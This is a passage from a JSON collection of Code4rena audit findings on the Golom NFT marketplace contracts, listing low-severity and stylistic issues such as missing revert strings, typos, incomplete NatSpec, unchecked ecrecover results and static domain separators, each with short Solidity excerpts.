      "content": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n*There are 13 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n203       function fillAsk(\n204           Order calldata o,\n205           uint256 amount,\n206           address referrer,\n207           Payment calldata p,\n208           address receiver\n209:      ) public payable nonReentrant {\n\n279       function fillBid(\n280           Order calldata o,\n281           uint256 amount,\n282           address referrer,\n283           Payment calldata p\n284:      ) public nonReentrant {\n\n312:      function cancelOrder(Order calldata o) public nonReentrant {\n\n334       function fillCriteriaBid(\n335           Order calldata o,\n336           uint256 amount,\n337           uint256 tokenId,\n338           bytes32[] calldata proof,\n339           address referrer,\n340           Payment calldata p\n341:      ) public nonReentrant {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L203-L209\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n98:       function addFee(address[2] memory addr, uint256 fee) public onlyTrader {\n\n141:      function traderClaim(address addr, uint256[] memory epochs) public {\n\n155:      function exchangeClaim(address addr, uint256[] memory epochs) public {\n\n172:      function multiStakerClaim(uint256[] memory tokenids, uint256[] memory epochs) public {\n\n215       function stakerRewards(uint256 tokenid) public view returns (\n216               uint256,\n217               uint256,\n218:              uint256[] memory\n\n254       function traderRewards(address addr) public view returns (\n255:              uint256        \n\n269       function exchangeRewards(address addr) public view returns (\n270:              uint256\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L98\n\n```solidity\nFile: contracts/vote-escrow/TokenUriHelper.sol\n\n66        function _tokenURI(\n67            uint256 _tokenId,\n68            uint256 _balanceOf,\n69            uint256 _locked_end,\n70            uint256 _value\n71:       ) public pure returns (string memory output) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/TokenUriHelper.sol#L66-L71\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n185:      function getPriorVotes(uint256 tokenId, uint256 blockNumber) public view returns (uint256) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L185\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23735",
      "title": "[N-08]  `require()`/`revert()` statements should have descriptive reason strings",
      "impact": "LOW",
      "content": "\n*There are 31 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n220:              require(msg.sender == o.reservedAddress);\n\n285           require(\n286               o.totalAmt * amount >\n287                   (o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt) * amount + p.paymentAmt\n288:          ); // cause bidder eth is paying for seller payment p , dont take anything extra from seller\n\n291:              require(msg.sender == o.reservedAddress);\n\n293:          require(o.orderType == 1);\n\n295:          require(status == 3);\n\n296:          require(amountRemaining >= amount);\n\n313:          require(o.signer == msg.sender);\n\n342:          require(o.totalAmt >= o.exchange.paymentAmt + o.prePayment.paymentAmt + o.refererrAmt);\n\n345:              require(msg.sender == o.reservedAddress);\n\n347:          require(o.orderType == 2);\n\n349:          require(status == 3);\n\n350:          require(amountRemaining >= amount);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L220\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n88:           require(msg.sender == trader);\n\n144:              require(epochs[index] < epoch);\n\n158:              require(epochs[index] < epoch);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L88\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n360:          require(_entered_state == _not_entered);\n\n540:          require(_isApprovedOrOwner(_sender, _tokenId));\n\n646:          require(owner != address(0));\n\n648:          require(_approved != owner);\n\n652:          require(senderIsOwner || senderIsApprovedForAll);\n\n869:          require(msg.sender == voter);\n\n874:          require(msg.sender == voter);\n\n879:          require(msg.sender == voter);\n\n884:          require(msg.sender == voter);\n\n889:          require(msg.sender == voter);\n\n895:          require(_from != _to);\n\n896:          require(_isApprovedOrOwner(msg.sender, _from));\n\n897:          require(_isApprovedOrOwner(msg.sender, _to));\n\n927:          require(_value > 0); // dev: need non-zero value\n\n944:          require(_value > 0); // dev: need non-zero value\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L360\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n245:          require(_isApprovedOrOwner(_sender, _tokenId));\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L245\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23734",
      "title": "[N-07]  Contract implements interface without extending the interface",
      "impact": "LOW",
      "content": "Not extending the interface may lead to the wrong function signature being used, leading to unexpected behavior. If the interface is in fact being implemented, use the `override` keyword to indicate that fact\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n/// @audit IERC721Enumerable.tokenOfOwnerByIndex()\n275:  contract VoteEscrowCore is IERC721, IERC721Metadata {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L275\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23733",
      "title": "[N-06]  Remove `include` for hardhat's console",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n9:    import 'hardhat/console.sol';\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L9\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23732",
      "title": "[N-05]  Invalid/extraneous/optional function definitions in interface",
      "impact": "LOW",
      "content": "\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n/// @audit withdraw(uint256) isn't defined with those arguments in the standard ERC20 definition\n33:       function withdraw(uint256 wad) external;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L33\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n/// @audit mint(address,uint256) isn't defined with those arguments in the standard ERC20 definition\n24:       function mint(address account, uint256 amount) external;\n\n/// @audit balanceOfNFTAt(uint256,uint256) isn't defined with those arguments in the standard ERC20 definition\n26:       function balanceOfNFTAt(uint256 _tokenId, uint256 _t) external view returns (uint256);\n\n/// @audit deposit() isn't defined with those arguments in the standard ERC20 definition\n28:       function deposit() external payable;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23731",
      "title": "[N-04]  Remove commented out code",
      "impact": "LOW",
      "content": "\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/vote-escrow/VoteEscrowDelegation.sol\n\n218      // /// @notice Remove delegation by user\n219      // function removeDelegationByOwner(uint256 delegatedTokenId, uint256 ownerTokenId) external {\n220      //     require(ownerOf(ownerTokenId) == msg.sender, 'VEDelegation: Not allowed');\n221      //     uint256 nCheckpoints = numCheckpoints[delegatedTokenId];\n222      //     Checkpoint storage checkpoint = checkpoints[delegatedTokenId][nCheckpoints - 1];\n223      //     removeElement(checkpoint.delegatedTokenIds, delegatedTokenId);\n224      //     _writeCheckpoint(ownerTokenId, nCheckpoints, checkpoint.delegatedTokenIds);\n225:     // }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L218-L225\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23730",
      "title": "[N-03]  Boilerplate not replaced",
      "impact": "LOW",
      "content": "\n*There are 2 instances of this issue:*\n```solidity\nFile: /contracts/governance/GolomToken.sol\n\n5:   /// @notice Explain to an end user what this does\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L5\n\n```solidity\nFile: /contracts/vote-escrow/VoteEscrowDelegation.sol\n\n68:      /// @notice Explain to an end user what this does\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L68\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23729",
      "title": "[N-02]  `ecrecover()` signature validity not checked",
      "impact": "LOW",
      "content": "`ecrecover()` returns the zero address if the signature is invalid. If the signer provided is also zero, then all incorrect signatures will be allowed\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/core/GolomTrader.sol\n\n176          address signaturesigner = ecrecover(hash, o.v, o.r, o.s);\n177          require(signaturesigner == o.signer, 'invalid signature');\n178          if (signaturesigner != o.signer) {\n179              return (0, hashStruct, 0);\n180:         }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L176-L180\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23728",
      "title": "[N-01]  Consider addings checks for signature malleability",
      "impact": "LOW",
      "content": "Use OpenZeppelin's `ECDSA` contract rather than calling `ecrecover()` directly\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/core/GolomTrader.sol\n\n176          address signaturesigner = ecrecover(hash, o.v, o.r, o.s);\n177          require(signaturesigner == o.signer, 'invalid signature');\n178          if (signaturesigner != o.signer) {\n179              return (0, hashStruct, 0);\n180:         }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L176-L180\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23727",
      "title": "[L-13]  NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 19 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n/// @audit Missing: '@return'\n162       ///      OrderStatus = 3 , valid order\n163       /// @param o the Order struct to be validated\n164       function validateOrder(Order calldata o)\n165           public\n166           view\n167           returns (\n168               uint256,\n169               bytes32,\n170:              uint256\n\n/// @audit Missing: '@param tokenId'\n/// @audit Missing: '@param proof'\n328       /// @dev function to fill a signed order of ordertype 2 also has a payment param in case the taker wants\n329       ///      to send ether to that address on filling the order, Match an criteria order, ensuring that the supplied proof demonstrates inclusion of the tokenId in the associated merkle root, if root is 0 then any token can be used to fill the order\n330       /// @param o the Order struct to be filled must be orderType 2\n331       /// @param amount the amount of times the order is to be filled(useful for ERC1155)\n332       /// @param referrer referrer of the order\n333       /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n334       function fillCriteriaBid(\n335           Order calldata o,\n336           uint256 amount,\n337           uint256 tokenId,\n338           bytes32[] calldata proof,\n339           address referrer,\n340           Payment calldata p\n341:      ) public nonReentrant {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L162-L170\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n/// @audit Missing: '@return'\n213       /// @dev returns unclaimed rewards of an NFT, returns (unclaimed golom rewards, unclaimed eth rewards, unclaimed epochs)\n214       /// @param tokenid the nft id to claim rewards for all ids in the list must belong to 1 address\n215       function stakerRewards(uint256 tokenid) public view returns (\n216               uint256,\n217               uint256,\n218:              uint256[] memory\n\n/// @audit Missing: '@return'\n252       /// @dev returns unclaimed rewards of an NFT, returns (unclaimed golom rewards, unclaimed eth rewards, unclaimed epochs)\n253       /// @param addr the nft id to claim rewards for all ids in the list must belong to 1 address\n254       function traderRewards(address addr) public view returns (\n255:              uint256        \n\n/// @audit Missing: '@return'\n267       /// @dev returns unclaimed golom rewards of a trader\n268       /// @param addr the nft id to claim rewards for all ids in the list must belong to 1 address\n269       function exchangeRewards(address addr) public view returns (\n270:              uint256\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L213-L218\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n/// @audit Missing: '@return'\n366       /// @dev Interface identification is specified in ERC-165.\n367       /// @param _interfaceID Id of the interface\n368:      function supportsInterface(bytes4 _interfaceID) external view returns (bool) {\n\n/// @audit Missing: '@return'\n396       ///      Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n397       /// @param _owner Address for whom to query the balance.\n398:      function _balance(address _owner) internal view returns (uint256) {\n\n/// @audit Missing: '@return'\n403       ///      Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n404       /// @param _owner Address for whom to query the balance.\n405:      function balanceOf(address _owner) external view returns (uint256) {\n\n/// @audit Missing: '@return'\n409       /// @dev Returns the address of the owner of the NFT.\n410       /// @param _tokenId The identifier for an NFT.\n411:      function ownerOf(uint256 _tokenId) public view returns (address) {\n\n/// @audit Missing: '@return'\n415       /// @dev Get the approved address for a single NFT.\n416       /// @param _tokenId ID of the NFT to query the approval of.\n417:      function getApproved(uint256 _tokenId) external view returns (address) {\n\n/// @audit Missing: '@return'\n422       /// @param _owner The address that owns the NFTs.\n423       /// @param _operator The address that acts on behalf of the owner.\n424:      function isApprovedForAll(address _owner, address _operator) external view returns (bool) {\n\n/// @audit Missing: '@return'\n935       /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n936       /// @param _to Address to deposit\n937       function _create_lock(\n938           uint256 _value,\n939           uint256 _lock_duration,\n940           address _to\n941:      ) internal returns (uint256) {\n\n/// @audit Missing: '@return'\n957       /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n958       /// @param _to Address to deposit\n959       function create_lock_for(\n960           uint256 _value,\n961           uint256 _lock_duration,\n962           address _to\n963:      ) external nonreentrant returns (uint256) {\n\n/// @audit Missing: '@return'\n968       /// @param _value Amount to deposit\n969       /// @param _lock_duration Number of seconds to lock tokens for (rounded down to nearest week)\n970:      function create_lock(uint256 _value, uint256 _lock_duration) external nonreentrant returns (uint256) {\n\n/// @audit Missing: '@param _tokenId'\n974       /// @notice Deposit `_value` additional tokens for `_tokenId` without modifying the unlock time\n975       /// @param _value Amount of tokens to deposit and add to the lock\n976:      function increase_amount(uint256 _tokenId, uint256 _value) external nonreentrant {\n\n/// @audit Missing: '@param _tokenId'\n988       /// @notice Extend the unlock time for `_tokenId`\n989       /// @param _lock_duration New number of seconds until tokens unlock\n990:      function increase_unlock_time(uint256 _tokenId, uint256 _lock_duration) external nonreentrant {\n\n/// @audit Missing: '@return'\n1079      /// @dev Returns current token URI metadata\n1080      /// @param _tokenId Token ID to fetch URI for.\n1081:     function tokenURI(uint256 _tokenId) external view returns (string memory) {\n\n/// @audit Missing: '@param t'\n1189      /// @notice Calculate total voting power\n1190      /// @dev Adheres to the ERC20 `totalSupply` interface for Aragon compatibility\n1191      /// @return Total voting power\n1192:     function totalSupplyAtT(uint256 t) public view returns (uint256) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L366-L368\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23726",
      "title": "[L-12]  Typos",
      "impact": "LOW",
      "content": "\n*There are 24 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n/// @audit succesful\n53:           Payment exchange; // payment agreed by maker of the order to pay on succesful filling of trade this amt is subtracted from totalamt\n\n/// @audit facilating\n54:           Payment prePayment; // another payment , can be used for royalty, facilating trades\n\n/// @audit usefull\n60:           uint256 nonce; // nonce of order usefull for cancelling in bulk\n\n/// @audit succesful\n201:      /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n\n/// @audit succesful\n278:      /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n\n/// @audit succesful\n333:      /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n\n/// @audit succesfully\n370:      /// @dev function to settle balances when a bid is filled succesfully\n\n/// @audit succesful\n374:      /// @param p any extra payment that the taker of this order wanna send on succesful execution of order\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L53\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n/// @audit epoc\n61:       mapping(uint256 => uint256) public rewardTrader; // reward minted each epoc for trader\n\n/// @audit epoc\n/// @audit exhange\n62:       mapping(uint256 => uint256) public rewardExchange; // reward minted each epoc for exhange\n\n/// @audit epoc\n63:       mapping(uint256 => uint256) public rewardLP; // reward minted each epoc for LP\n\n/// @audit epoc\n64:       mapping(uint256 => uint256) public rewardStaker; // reward minted each epoc for stakers\n\n/// @audit upto\n66:       mapping(uint256 => uint256) public claimedUpto; // epoch upto which tokenid has claimed\n\n/// @audit upto\n67:       mapping(uint256 => mapping(uint256 => uint256)) public claimed; // epoch upto which tokenid has claimed\n\n/// @audit facilated\n95:       /// @dev Add fees contributed by the Seller of nft and the exchange/frontend that facilated the trade\n\n/// @audit atleast\n107:              // this assumes atleast 1 trade is done daily??????\n\n/// @audit begiining\n/// @audit begining\n111:              // emissions is decided by epoch begiining locked/circulating , and amount each nft gets also decided at epoch begining\n\n/// @audit facilated\n154:      // allows exchange that facilated the nft trades to claim there previous epoch rewards\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L61\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n/// @audit blocktimes\n267:   * and per block could be fairly bad b/c Ethereum changes blocktimes.\n\n/// @audit Exeute\n526:      /// @dev Exeute transfer of a NFT.\n\n/// @audit Pevious\n688:      /// @param old_locked Pevious locked amount / end lock time for the user\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L267\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n/// @audit Exeute\n227:      /// @dev Exeute transfer of a NFT.\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L227\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23725",
      "title": "[L-11]  Inconsistent spacing in comments",
      "impact": "LOW",
      "content": "Some lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n181:          //deadline\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L181\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n99:           //console.log(block.timestamp,epoch,fee);\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L99\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23724",
      "title": "[L-10]  Missing event and or timelock for critical parameter change",
      "impact": "LOW",
      "content": "Events help non-contract tools to track changes, and events prevent users from being surprised by changes\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n444       function setDistributor(address _distributor) external onlyOwner {\n445           if (address(distributor) == address(0)) {\n446               distributor = Distributor(_distributor);\n447           } else {\n448               pendingDistributor = _distributor;\n449               distributorEnableDate = block.timestamp + 1 days;\n450           }\n451:      }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L444-L451\n\n```solidity\nFile: contracts/governance/GolomToken.sol\n\n58        function setMinter(address _minter) external onlyOwner {\n59            pendingMinter = _minter;\n60            minterEnableDate = block.timestamp + 1 days;\n61:       }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L58-L61\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n868       function setVoter(address _voter) external {\n869           require(msg.sender == voter);\n870           voter = _voter;\n871:      }\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L868-L871\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23723",
      "title": "[L-09]  Missing checks for `address(0x0)` when assigning values to `address` state variables",
      "impact": "LOW",
      "content": "\n*There are 7 instances of this issue:*\n```solidity\nFile: contracts/core/GolomTrader.sol\n\n448:              pendingDistributor = _distributor;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L448\n\n```solidity\nFile: contracts/governance/GolomToken.sol\n\n59:           pendingMinter = _minter;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/governance/GolomToken.sol#L59\n\n```solidity\nFile: contracts/rewards/RewardDistributor.sol\n\n81:           trader = _trader;\n\n287:          pendingTrader = _trader;\n\n303:              pendingVoteEscrow = _voteEscrow;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L81\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowCore.sol\n\n870:          voter = _voter;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowCore.sol#L870\n\n```solidity\nFile: contracts/vote-escrow/VoteEscrowDelegation.sol\n\n53:           token = _token;\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/vote-escrow/VoteEscrowDelegation.sol#L53\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23722",
      "title": "[L-08]  Wrong comment",
      "impact": "LOW",
      "content": "The function description and return values are incorrectly copied from another function\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/rewards/RewardDistributor.sol\n\n252      /// @dev returns unclaimed rewards of an NFT, returns (unclaimed golom rewards, unclaimed eth rewards, unclaimed epochs)\n253      /// @param addr the nft id to claim rewards for all ids in the list must belong to 1 address\n254      function traderRewards(address addr) public view returns (\n255              uint256        \n256:             ){\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L252-L256\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23721",
      "title": "[L-07]  Vulnerable to cross-chain replay attacks due to static `DOMAIN_SEPARATOR`/`domainSeparator`",
      "impact": "LOW",
      "content": "See [this](https://github.com/code-423n4/2021-04-maple-findings/issues/2) issue from a prior contest for details\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/core/GolomTrader.sol\n\n101          EIP712_DOMAIN_TYPEHASH = keccak256(\n102              abi.encode(\n103                  keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n104                  keccak256(bytes('GOLOM.IO')),\n105                  keccak256(bytes('1')),\n106                  chainId,\n107                  address(this)\n108              )\n109:         );\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/core/GolomTrader.sol#L101-L109\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23720",
      "title": "[L-06]  Function may run out of gas",
      "impact": "LOW",
      "content": "Once the number of epochs grow to a large number, the array allocated will be large, and the number of iterations calling external functions on `ve` will also be large, leading to the function running out of gas\n\n*There is 1 instance of this issue:*\n```solidity\nFile: /contracts/rewards/RewardDistributor.sol\n\n215      function stakerRewards(uint256 tokenid) public view returns (\n216              uint256,\n217              uint256,\n218              uint256[] memory\n219          ){\n220          require(address(ve) != address(0), ' VE not added yet');\n221  \n222          uint256 reward = 0;\n223          uint256 rewardEth = 0;\n224          uint256[] memory unclaimedepochs = new uint256[](epoch);\n225          // for each epoch\n226:         for (uint256 index = 0; index < epoch; index++) {\n\n```\nhttps://github.com/code-423n4/2022-07-golom/blob/e5efa8f9d6dda92a90b8b2c4902320acf0c26816/contracts/rewards/RewardDistributor.sol#L215-L224\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Golom",
      "source_link": "https://code4rena.com/reports/2022-07-golom",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "23719",
      "title": "[L-05]  Self-delegation is not automatic",
      "impact": "LOW",
